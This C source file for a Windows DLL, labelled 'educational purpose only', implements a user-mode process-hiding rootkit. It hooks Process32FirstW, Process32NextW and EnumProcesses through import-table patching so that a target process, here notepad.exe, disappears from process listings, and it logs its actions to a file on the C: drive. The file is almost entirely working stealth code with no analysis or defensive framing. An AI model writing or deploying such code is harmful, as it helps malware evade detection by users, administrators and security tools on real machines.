/**
 * Windows Process Hiding Library - Educational Purpose Only
 * Clean version with proper error handling
 */

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// Target process to hide
static WCHAR g_szTargetProcess[] = L"notepad.exe";
static DWORD g_dwTargetPID = 0;

// Original function pointers
typedef HANDLE (WINAPI *CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL (WINAPI *Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *EnumProcesses_t)(DWORD*, DWORD, LPDWORD);

static CreateToolhelp32Snapshot_t Real_CreateToolhelp32Snapshot = NULL;
static Process32FirstW_t Real_Process32FirstW = NULL;
static Process32NextW_t Real_Process32NextW = NULL;
static EnumProcesses_t Real_EnumProcesses = NULL;

// Logging function
void LogToFile(LPCWSTR message) {
    HANDLE hFile = CreateFileW(L"C:\\process_hider_log.txt", 
        GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD written;
        WriteFile(hFile, message, (DWORD)(wcslen(message) * sizeof(WCHAR)), &written, NULL);
        WriteFile(hFile, L"\r\n", 4, &written, NULL);
        CloseHandle(hFile);
    }
}

// Get process PID by name
DWORD GetProcessPIDByName(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// Hook Process32FirstW
BOOL WINAPI Hook_Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    if (!Real_Process32FirstW) {
        Real_Process32FirstW = (Process32FirstW_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Process32FirstW");
    }
    
    BOOL result = Real_Process32FirstW(hSnapshot, lppe);
    
    // Skip target process
    while (result) {
        if (_wcsicmp(lppe->szExeFile, g_szTargetProcess) == 0 || lppe->th32ProcessID == g_dwTargetPID) {
            LogToFile(L"Hiding notepad in Process32FirstW");
            result = Real_Process32FirstW ? Real_Process32FirstW(hSnapshot, lppe) : FALSE;
            if (!result) break;
            result = Process32NextW(hSnapshot, lppe);
        } else {
            break;
        }
    }
    
    return result;
}

// Hook Process32NextW  
BOOL WINAPI Hook_Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    if (!Real_Process32NextW) {
        Real_Process32NextW = (Process32NextW_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Process32NextW");
    }
    
    BOOL result;
    
    do {
        result = Real_Process32NextW(hSnapshot, lppe);
        if (!result) break;
        
        // Skip target process
        if (_wcsicmp(lppe->szExeFile, g_szTargetProcess) == 0 || lppe->th32ProcessID == g_dwTargetPID) {
            LogToFile(L"Hiding notepad in Process32NextW");
            continue;
        }
        
        break;
    } while (result);
    
    return result;
}

// Hook EnumProcesses
BOOL WINAPI Hook_EnumProcesses(DWORD* lpidProcess, DWORD cb, LPDWORD lpcbNeeded) {
    if (!Real_EnumProcesses) {
        Real_EnumProcesses = (EnumProcesses_t)GetProcAddress(GetModuleHandleW(L"psapi.dll"), "EnumProcesses");
        if (!Real_EnumProcesses) {
            Real_EnumProcesses = (EnumProcesses_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "K32EnumProcesses");
        }
    }
    
    BOOL result = Real_EnumProcesses(lpidProcess, cb, lpcbNeeded);
    
    // Filter out target process
    if (result && g_dwTargetPID != 0 && lpidProcess && lpcbNeeded) {
        DWORD count = *lpcbNeeded / sizeof(DWORD);
        DWORD newCount = 0;
        
        for (DWORD i = 0; i < count; i++) {
            if (lpidProcess[i] != g_dwTargetPID) {
                lpidProcess[newCount++] = lpidProcess[i];
            }
        }
        
        if (newCount < count) {
            *lpcbNeeded = newCount * sizeof(DWORD);
            LogToFile(L"Filtered notepad from EnumProcesses");
        }
    }
    
    return result;
}

// IAT hooking function
BOOL HookFunction(HMODULE hModule, LPCSTR szLibraryName, LPCSTR szFunctionName, LPVOID pNewFunction) {
    if (!hModule || !szLibraryName || !szFunctionName || !pNewFunction) return FALSE;
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDosHeader->e_lfanew);
    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    DWORD importRVA = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) return FALSE;
    
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)hModule + importRVA);
    
    while (pImportDesc->Name) {
        LPSTR pszLibraryName = (LPSTR)((LPBYTE)hModule + pImportDesc->Name);
        
        if (_stricmp(pszLibraryName, szLibraryName) == 0) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pImportDesc->OriginalFirstThunk);
            
            while (pThunk->u1.Function && pOrigThunk->u1.Ordinal) {
                if (!(pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)hModule + pOrigThunk->u1.AddressOfData);
                    
                    if (strcmp((LPCSTR)pImportByName->Name, szFunctionName) == 0) {
                        DWORD dwOldProtect;
                        if (VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect)) {
                            pThunk->u1.Function = (DWORD_PTR)pNewFunction;
                            VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
                            return TRUE;
                        }
                    }
                }
                pThunk++;
                pOrigThunk++;
            }
        }
        pImportDesc++;
    }
    
    return FALSE;
}

// Install hooks
void InstallHooks() {
    HMODULE hCurrentModule = GetModuleHandleW(NULL);
    
    if (hCurrentModule) {
        LogToFile(L"Installing process hiding hooks...");
        
        // Hook kernel32 functions
        if (HookFunction(hCurrentModule, "kernel32.dll", "Process32FirstW", Hook_Process32FirstW)) {
            LogToFile(L"Hooked Process32FirstW");
        }
        
        if (HookFunction(hCurrentModule, "kernel32.dll", "Process32NextW", Hook_Process32NextW)) {
            LogToFile(L"Hooked Process32NextW");
        }
        
        // Hook psapi functions
        if (HookFunction(hCurrentModule, "psapi.dll", "EnumProcesses", Hook_EnumProcesses)) {
            LogToFile(L"Hooked EnumProcesses");
        }
        
        if (HookFunction(hCurrentModule, "kernel32.dll", "K32EnumProcesses", Hook_EnumProcesses)) {
            LogToFile(L"Hooked K32EnumProcesses");
        }
        
        LogToFile(L"Hook installation completed");
    }
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            LogToFile(L"Process hider DLL loaded");
            
            // Get current PID of notepad
            g_dwTargetPID = GetProcessPIDByName(g_szTargetProcess);
            
            if (g_dwTargetPID != 0) {
                WCHAR logMsg[256];
                swprintf_s(logMsg, 256, L"Found notepad.exe with PID: %lu", g_dwTargetPID);
                LogToFile(logMsg);
                
                // Install hooks
                InstallHooks();
            } else {
                LogToFile(L"notepad.exe not found - hooks will still be installed");
                InstallHooks();
            }
            break;
            
        case DLL_PROCESS_DETACH:
            LogToFile(L"Process hider DLL unloaded");
            break;
    }
    
    return TRUE;
}
